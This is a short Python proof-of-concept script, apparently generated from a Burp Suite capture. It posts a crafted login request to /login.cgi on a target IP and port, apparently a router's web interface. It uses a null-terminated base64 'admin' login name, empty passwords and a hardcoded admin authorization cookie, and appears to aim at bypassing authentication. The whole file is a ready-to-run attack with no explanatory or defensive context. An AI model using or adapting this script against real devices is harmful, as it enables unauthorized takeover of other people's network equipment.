import requests
import sys 


def main(ip,port):
    burp0_url = "http://"+ip+":"+str(port)+"/login.cgi"
    burp0_cookies = {"SESSION_ID": "2:1598955103:2", "password": "ggv23f", "PHPSESSID": "0312f31bee015f85dd6f143d22dffb5d", "uid": "ujcI4DPmyw", "PrivateKey": "C8B843B87E7C03EF5F224D6D4949A7F1", "Authorization": "Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D", "timeout": "4"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+ip+":"+str(port)+"", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"+ip+":"+str(port)+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en;q=0.9,zh-CN;q=0.8,zh;q=0.7", "Connection": "close"}
    burp0_data = {"html_response_page": "login.asp", "login_name": "YWRtaW4A", "login_pass": '', "graph_id": "f7a98", "alert_id": "0", "log_pass": '', "graph_code": '', "login": "Log In"}
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print(response.text)


if __name__ == '__main__':

    ip = sys.argv[1]
    port = sys.argv[2]
    port = int(port)
    main(ip,port)